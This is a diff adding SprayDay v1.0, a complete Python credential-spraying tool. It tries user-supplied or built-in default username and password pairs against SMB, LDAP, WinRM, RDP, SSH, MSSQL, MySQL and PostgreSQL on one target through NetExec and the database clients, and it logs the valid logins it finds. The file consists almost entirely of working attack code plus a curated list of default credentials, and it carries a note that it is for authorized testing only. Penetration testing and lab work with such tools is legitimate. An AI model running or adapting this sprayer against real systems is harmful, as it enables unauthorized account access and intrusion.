@@ -1,0 +1,579 @@
+#!/usr/bin/env python3
+#                              SprayDay v1.0
+#        Multi-Protocol Credential & Default-Credential Sprayer
+# Author: bmjanet
+# Purpose: Spray supplied or curated default credentials across network
+#          services and databases on a single target, using native Kali
+#          tooling (NetExec, mysql, psql).
+#
+# For AUTHORIZED security testing only (engagements you have permission to
+# run, labs, CTFs, Proving Grounds, etc.). You are responsible for how you
+# use it.
+
+import argparse
+import ipaddress
+import os
+import shutil
+import subprocess
+import sys
+from datetime import datetime
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Constants
+# ─────────────────────────────────────────────────────────────────────────────
+
+VERSION = "1.0"
+
+# All services offered in the checklist. Order is the run order.
+# "backend" tells the runner which engine drives the service.
+SERVICES = [
+    ("smb",   "nxc"),
+    ("ldap",  "nxc"),
+    ("winrm", "nxc"),
+    ("rdp",   "nxc"),
+    ("ssh",   "nxc"),
+    ("mssql", "nxc"),
+    ("mysql", "mysql"),
+    ("pgsql", "psql"),
+]
+SERVICE_NAMES = [name for name, _ in SERVICES]
+BACKEND = dict(SERVICES)
+
+# Backend tool → the executable that must be on PATH for it to work.
+BACKEND_BINARY = {
+    "nxc":   "nxc",
+    "mysql": "mysql",
+    "psql":  "psql",
+}
+
+# Curated default credentials, per service, as (user, password) pairs.
+# A blank password is the empty string "".
+#
+# Sources: SecLists Passwords/Default-Credentials/*-betterdefaultpasslist.txt
+# plus common public references, trimmed to high-signal entries.
+#
+# NOTE: smb/ldap/winrm/rdp are normally domain-authenticated, so real
+# "default credentials" barely exist for them. Those lists are intentionally
+# thin, generic guesses (local Administrator / guest) and will usually miss.
+DEFAULT_CREDS = {
+    "mssql": [
+        ("sa", ""),
+        ("sa", "sa"),
+        ("sa", "admin"),
+        ("sa", "password"),
+        ("sa", "Password123"),
+        ("sa", "sqlserver"),
+        ("sa", "superadmin"),
+        ("sa", "default"),
+        ("sa", "RPSsql12345"),
+        ("admin", "admin"),
+    ],
+    "mysql": [
+        ("root", ""),
+        ("root", "root"),
+        ("root", "mysql"),
+        ("root", "password"),
+        ("root", "123"),
+        ("root", "123456"),
+        ("root", "toor"),
+        ("root", "raspberry"),
+        ("admin", "admin"),
+        ("mysql", "mysql"),
+    ],
+    "pgsql": [
+        ("postgres", ""),
+        ("postgres", "postgres"),
+        ("postgres", "password"),
+        ("postgres", "admin"),
+        ("postgres", "123"),
+        ("postgres", "changeme"),
+        ("admin", "admin"),
+        ("admin", "password"),
+    ],
+    "ssh": [
+        ("root", "root"),
+        ("root", "toor"),
+        ("root", "admin"),
+        ("root", "password"),
+        ("root", "raspberry"),
+        ("pi", "raspberry"),
+        ("admin", "admin"),
+        ("admin", "password"),
+        ("ubuntu", "ubuntu"),
+        ("kali", "kali"),
+    ],
+    # Thin generic Windows defaults — see NOTE above.
+    "smb": [
+        ("administrator", ""),
+        ("administrator", "administrator"),
+        ("administrator", "password"),
+        ("administrator", "Password123"),
+        ("administrator", "admin"),
+        ("admin", "admin"),
+        ("guest", ""),
+    ],
+}
+# ldap/winrm/rdp share the generic Windows list with smb.
+for _svc in ("ldap", "winrm", "rdp"):
+    DEFAULT_CREDS[_svc] = list(DEFAULT_CREDS["smb"])
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Output helpers
+# ─────────────────────────────────────────────────────────────────────────────
+
+class C:
+    """ANSI colors, auto-disabled when not writing to a TTY."""
+    _on = sys.stdout.isatty()
+    RESET = "\033[0m" if _on else ""
+    RED = "\033[91m" if _on else ""
+    GREEN = "\033[92m" if _on else ""
+    YELLOW = "\033[93m" if _on else ""
+    BLUE = "\033[94m" if _on else ""
+    CYAN = "\033[96m" if _on else ""
+    BOLD = "\033[1m" if _on else ""
+
+
+def info(msg):
+    print(f"{C.BLUE}[*]{C.RESET} {msg}")
+
+
+def good(msg):
+    print(f"{C.GREEN}[+]{C.RESET} {msg}")
+
+
+def bad(msg):
+    print(f"{C.RED}[-]{C.RESET} {msg}")
+
+
+def warn(msg):
+    print(f"{C.YELLOW}[!]{C.RESET} {msg}")
+
+
+def die(msg, code=1):
+    bad(msg)
+    sys.exit(code)
+
+
+def banner(target, protocols, mode):
+    line = "=" * 48
+    print(line)
+    print(f"           {C.BOLD}SprayDay v{VERSION}{C.RESET}")
+    print("   Multi-Protocol Credential Sprayer")
+    print(line)
+    info(f"Target    : {target}")
+    info(f"Services  : {', '.join(protocols)}")
+    info(f"Mode      : {mode}")
+    print(line)
+    print()
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Input helpers
+# ─────────────────────────────────────────────────────────────────────────────
+
+def valid_ip(value):
+    try:
+        ipaddress.ip_address(value)
+        return True
+    except ValueError:
+        return False
+
+
+def load_spec(spec):
+    """Resolve a -u/-p value that may be a single value or a file path into a
+    list of values. Blank lines in files are dropped; a single value becomes a
+    one-item list."""
+    if spec is None:
+        return []
+    if os.path.isfile(spec):
+        with open(spec, "r", encoding="utf-8", errors="replace") as fh:
+            return [line.rstrip("\n") for line in fh if line.strip()]
+    return [spec]
+
+
+def prompt_ip():
+    from InquirerPy import inquirer
+    from InquirerPy.validator import ValidationError
+
+    def _validate(result):
+        if not valid_ip(result.strip()):
+            raise ValidationError(
+                message="Enter a valid IPv4/IPv6 address",
+                cursor_position=len(result),
+            )
+        return True
+
+    return inquirer.text(
+        message="Target IP address:",
+        validate=_validate,
+    ).execute().strip()
+
+
+def prompt_services():
+    from InquirerPy import inquirer
+    from InquirerPy.base.control import Choice
+
+    choices = [Choice(name, name=name) for name in SERVICE_NAMES]
+    selected = inquirer.checkbox(
+        message="Select services to spray (space to toggle, enter to confirm):",
+        choices=choices,
+        validate=lambda r: len(r) >= 1,
+        invalid_message="Select at least one service.",
+        instruction="",
+    ).execute()
+    return selected
+
+
+def require_inquirerpy():
+    try:
+        import InquirerPy  # noqa: F401
+    except ImportError:
+        die(
+            "InquirerPy is not installed. Install it with:\n"
+            "      pip3 install InquirerPy\n"
+            "    or run ./install.sh to set up an isolated venv."
+        )
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Backends
+# ─────────────────────────────────────────────────────────────────────────────
+
+# How long to wait on a single NetExec invocation before giving up.
+NXC_TIMEOUT = 90
+
+
+def run_nxc(protocol, target, user, password, cont_flag, nobrute_flag):
+    """Run a single nxc credential check. Returns (success, raw_output)."""
+    cmd = ["nxc", protocol, target, "-u", user, "-p", password]
+    if cont_flag:
+        cmd.append("--continue-on-success")
+    if nobrute_flag:
+        cmd.append("--no-bruteforce")
+    try:
+        proc = subprocess.run(
+            cmd, capture_output=True, text=True, timeout=NXC_TIMEOUT
+        )
+    except subprocess.TimeoutExpired:
+        return False, "timeout"
+    except FileNotFoundError:
+        return False, "nxc-not-found"
+
+    out = proc.stdout + proc.stderr
+    success = _nxc_hit(out)
+    return success, out
+
+
+def run_nxc_spec(protocol, target, user_spec, pass_spec, cont_flag, nobrute_flag):
+    """Manual mode for nxc: pass the raw -u/-p specs (single value or file
+    path) straight through so nxc handles the cartesian spray and its own
+    pretty output. Streams output live; parses captured output for hits."""
+    cmd = ["nxc", protocol, target, "-u", user_spec, "-p", pass_spec]
+    if cont_flag:
+        cmd.append("--continue-on-success")
+    if nobrute_flag:
+        cmd.append("--no-bruteforce")
+
+    hits = []
+    try:
+        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=NXC_TIMEOUT)
+    except subprocess.TimeoutExpired:
+        warn(f"    nxc {protocol} timed out")
+        return hits
+    except FileNotFoundError:
+        return hits
+
+    out = proc.stdout + proc.stderr
+    for line in out.splitlines():
+        # Echo nxc's own status lines so the user sees native output.
+        stripped = line.rstrip()
+        if stripped:
+            print(f"    {stripped}")
+        if _nxc_line_hit(line):
+            hits.append(line.strip())
+    return hits
+
+
+def _nxc_hit(output):
+    for line in output.splitlines():
+        if _nxc_line_hit(line):
+            return True
+    return False
+
+
+def _nxc_line_hit(line):
+    # NetExec marks a valid login with a green "[+]" on the credential line
+    # (with "(Pwn3d!)" appended when the account is also admin). Failed logins
+    # use "[-]", and the host banner uses "[*]".
+    return "[+]" in line
+
+
+DB_TIMEOUT = 8
+
+
+def run_mysql(target, user, password):
+    """Attempt one MySQL login. Returns (success, detail)."""
+    # mysql takes the password glued to -p with no space.
+    pw_arg = f"-p{password}" if password != "" else "-p"
+    cmd = [
+        "mysql", "-h", target, "-u", user, pw_arg,
+        "--connect-timeout=5", "-e", "SELECT 1;",
+    ]
+    # When password is blank, -p with no value would prompt; use --skip-password.
+    if password == "":
+        cmd = [
+            "mysql", "-h", target, "-u", user, "--skip-password",
+            "--connect-timeout=5", "-e", "SELECT 1;",
+        ]
+    try:
+        proc = subprocess.run(
+            cmd, capture_output=True, text=True, timeout=DB_TIMEOUT
+        )
+    except subprocess.TimeoutExpired:
+        return False, "timeout"
+    except FileNotFoundError:
+        return False, "mysql-not-found"
+    if proc.returncode == 0:
+        return True, ""
+    err = (proc.stderr or "").strip().splitlines()
+    return False, err[-1] if err else f"exit {proc.returncode}"
+
+
+def run_psql(target, user, password):
+    """Attempt one PostgreSQL login. Returns (success, detail)."""
+    env = dict(os.environ)
+    env["PGPASSWORD"] = password
+    env["PGCONNECT_TIMEOUT"] = "5"
+    cmd = [
+        "psql", "-h", target, "-U", user, "-d", "postgres",
+        "-w", "-t", "-c", "SELECT 1;",
+    ]
+    try:
+        proc = subprocess.run(
+            cmd, capture_output=True, text=True, timeout=DB_TIMEOUT, env=env
+        )
+    except subprocess.TimeoutExpired:
+        return False, "timeout"
+    except FileNotFoundError:
+        return False, "psql-not-found"
+    if proc.returncode == 0:
+        return True, ""
+    err = (proc.stderr or "").strip().splitlines()
+    return False, err[-1] if err else f"exit {proc.returncode}"
+
+
+DB_RUNNER = {"mysql": run_mysql, "psql": run_psql}
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Spray orchestration
+# ─────────────────────────────────────────────────────────────────────────────
+
+def fmt_cred(user, password):
+    shown_pw = password if password != "" else "<blank>"
+    return f"{user}:{shown_pw}"
+
+
+def spray_pairs(service, target, pairs, cont_flag, nobrute_flag, cont_after_hit):
+    """Spray an explicit list of (user, password) pairs against one service.
+    Used by --default mode, and by manual mode for the DB services. Returns a
+    list of hit strings 'user:password'."""
+    backend = BACKEND[service]
+    hits = []
+    for user, password in pairs:
+        label = fmt_cred(user, password)
+        if backend == "nxc":
+            success, _ = run_nxc(service, target, user, password,
+                                 cont_flag, nobrute_flag)
+        else:
+            runner = DB_RUNNER[backend]
+            success, detail = runner(target, user, password)
+        if success:
+            good(f"    VALID  {label}")
+            hits.append(label)
+            if not cont_after_hit:
+                info("    stopping this service after first hit "
+                     "(use --continue-on-success to keep going)")
+                break
+        else:
+            print(f"    {C.RED}invalid{C.RESET} {label}")
+    return hits
+
+
+def run_service(service, target, args, users, passwords):
+    """Dispatch one service based on mode. Returns list of hit strings."""
+    backend = BACKEND[service]
+
+    # Pre-flight: is the backend tool present?
+    binary = BACKEND_BINARY[backend]
+    if shutil.which(binary) is None:
+        warn(f"{binary} not found on PATH — skipping {service}")
+        return []
+
+    print(f"{C.CYAN}{'─' * 48}{C.RESET}")
+    print(f"{C.BOLD}[>] {service}{C.RESET}  (via {binary})")
+    print(f"{C.CYAN}{'─' * 48}{C.RESET}")
+
+    if args.default:
+        pairs = DEFAULT_CREDS.get(service, [])
+        if not pairs:
+            warn(f"no default credentials defined for {service}")
+            return []
+        return spray_pairs(service, target, pairs, args.continue_on_success,
+                           args.no_bruteforce, args.continue_on_success)
+
+    # Manual mode.
+    if backend == "nxc":
+        # Let nxc handle the spray natively from the raw specs.
+        return run_nxc_spec(service, target, args.user, args.password,
+                            args.continue_on_success, args.no_bruteforce)
+    # DB services: iterate the cartesian product ourselves.
+    pairs = [(u, p) for u in users for p in passwords]
+    return spray_pairs(service, target, pairs, args.continue_on_success,
+                       args.no_bruteforce, args.continue_on_success)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Main
+# ─────────────────────────────────────────────────────────────────────────────
+
+def build_parser():
+    p = argparse.ArgumentParser(
+        prog="sprayday",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        description="SprayDay — multi-protocol credential & default-credential "
+                    "sprayer for a single target.",
+        epilog=(
+            "Services: " + ", ".join(SERVICE_NAMES) + "\n\n"
+            "Examples:\n"
+            "  sprayday 10.10.10.10 -u admin -p 'P@ssw0rd!'\n"
+            "  sprayday 10.10.10.10 -u users.txt -p passwords.txt\n"
+            "  sprayday 10.10.10.10 --default\n"
+            "  sprayday 10.10.10.10 --default --services mysql,pgsql,mssql\n"
+            "  sprayday               # prompts for IP and services\n\n"
+            "For authorized security testing only."
+        ),
+    )
+    p.add_argument("ip", nargs="?", help="Target IP address (prompted if omitted)")
+    p.add_argument("-u", "--user", metavar="USER|FILE",
+                   help="Username, or path to a file of usernames (one per line)")
+    p.add_argument("-p", "--password", metavar="PASS|FILE",
+                   help="Password, or path to a file of passwords (one per line)")
+    p.add_argument("--default", action="store_true",
+                   help="Spray curated default credentials per selected service "
+                        "(ignores -u/-p)")
+    p.add_argument("--services", metavar="LIST",
+                   help="Comma-separated services to skip the interactive menu, "
+                        "e.g. smb,mysql")
+    p.add_argument("--continue-on-success", action="store_true",
+                   help="Keep spraying a service after a valid credential is found")
+    p.add_argument("--no-bruteforce", action="store_true",
+                   help="Pass --no-bruteforce to NetExec (safer, one cred at a time)")
+    p.add_argument("-o", "--output", metavar="FILE",
+                   help="Also append valid credentials to this file")
+    p.add_argument("-V", "--version", action="version",
+                   version=f"SprayDay v{VERSION}")
+    return p
+
+
+def resolve_services(args):
+    if args.services:
+        chosen = [s.strip().lower() for s in args.services.split(",") if s.strip()]
+        unknown = [s for s in chosen if s not in SERVICE_NAMES]
+        if unknown:
+            die(f"Unknown service(s): {', '.join(unknown)}. "
+                f"Valid: {', '.join(SERVICE_NAMES)}")
+        # Preserve canonical run order.
+        return [s for s in SERVICE_NAMES if s in chosen]
+    require_inquirerpy()
+    return [s for s in SERVICE_NAMES if s in set(prompt_services())]
+
+
+def main():
+    args = build_parser().parse_args()
+
+    # Mode validation.
+    if args.default and (args.user or args.password):
+        die("--default is standalone and cannot be combined with -u/-p")
+    if not args.default:
+        if not args.user or not args.password:
+            die("Manual mode requires both -u and -p (or use --default)")
+
+    # Resolve target IP (arg or prompt).
+    target = args.ip
+    if not target:
+        require_inquirerpy()
+        target = prompt_ip()
+    if not valid_ip(target):
+        die(f"Invalid IP address: {target}")
+
+    # Resolve services (menu or --services).
+    services = resolve_services(args)
+    if not services:
+        die("No services selected")
+
+    # Load credential specs for manual DB iteration.
+    users = load_spec(args.user)
+    passwords = load_spec(args.password)
+
+    mode = "default credentials" if args.default else "manual (-u/-p)"
+    banner(target, services, mode)
+
+    all_hits = []  # list of (service, cred)
+    for service in services:
+        for cred in run_service(service, target, args, users, passwords):
+            all_hits.append((service, cred))
+        print()
+
+    # Summary.
+    print("=" * 48)
+    if all_hits:
+        good(f"{len(all_hits)} valid credential(s) found:")
+        seen = set()
+        for service, cred in all_hits:
+            key = (service, cred)
+            if key in seen:
+                continue
+            seen.add(key)
+            print(f"    {C.GREEN}{service:6}{C.RESET} {cred}")
+        write_log(target, all_hits, args.output)
+    else:
+        info("No valid credentials found.")
+    print("=" * 48)
+    good("Spray complete!")
+
+
+def write_log(target, hits, extra_output):
+    ts = datetime.now().strftime("%Y%m%d-%H%M%S")
+    default_path = f"sprayday-{target}-{ts}.log"
+    paths = [default_path]
+    if extra_output:
+        paths.append(extra_output)
+    seen = set()
+    lines = []
+    for service, cred in hits:
+        key = (service, cred)
+        if key in seen:
+            continue
+        seen.add(key)
+        lines.append(f"{ts}\t{target}\t{service}\t{cred}")
+    body = "\n".join(lines) + "\n"
+    for path in paths:
+        try:
+            with open(path, "a", encoding="utf-8") as fh:
+                fh.write(body)
+        except OSError as exc:
+            warn(f"could not write log {path}: {exc}")
+            continue
+    info(f"Valid credentials logged to: {default_path}"
+         + (f" and {extra_output}" if extra_output else ""))
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print()
+        bad("Interrupted by user")
+        sys.exit(130)
